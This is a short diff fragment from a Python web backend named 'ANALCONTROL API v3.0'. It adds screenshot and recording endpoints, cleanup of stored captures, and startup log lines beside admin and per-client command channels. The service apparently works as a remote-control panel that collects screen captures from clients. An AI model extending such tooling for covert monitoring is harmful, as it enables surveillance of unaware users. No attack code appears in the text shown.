+                "screenshots": "/api/screenshots",
+                "recordings": "/api/recordings",
                 "ws_admin": "/ws/admin",
                 "ws_client": "/ws/client/{client_id}",
                 "ws_chat": "/ws/chat/{user_id}"
@@ -2299,6 +2807,14 @@ async def cleanup_tasks():
             if len(db.commands) > 500:
                 db.commands = db.commands[-500:]
             
+            # Clean up old screenshots (keep last 200)
+            if len(db.screenshots) > 200:
+                db.screenshots = db.screenshots[-200:]
+            
+            # Clean up old recordings (keep last 100)
+            if len(db.recordings) > 100:
+                db.recordings = db.recordings[-100:]
+            
         except Exception as e:
             logger.error(f"Cleanup task error: {e}")
         
@@ -2312,12 +2828,15 @@ async def startup_event():
     logger.info("🚀 ANALCONTROL API v3.0 Starting...")
     logger.info(f"📡 Port: {PORT}")
     logger.info(f"🔗 Backend URL: {BACKEND_URL}")
+    logger.info(f"🎨 Theme: Red/Black")
     logger.info(f"📊 Supabase: {'Connected' if supabase else 'Not Connected'}")
     logger.info("🔗 WebSocket endpoints:")
     logger.info("   • Admin: /ws/admin")
     logger.info("   • Client: /ws/client/{client_id}")
     logger.info("   • Chat: /ws/chat/{user_id}")
     logger.info("📚 Documentation: /docs")
+    logger.info("📸 Screenshots: /api/screenshots")
+    logger.info("🎥 Recordings: /api/recordings")
     
     # Start background tasks
     asyncio.create_task(cleanup_tasks())
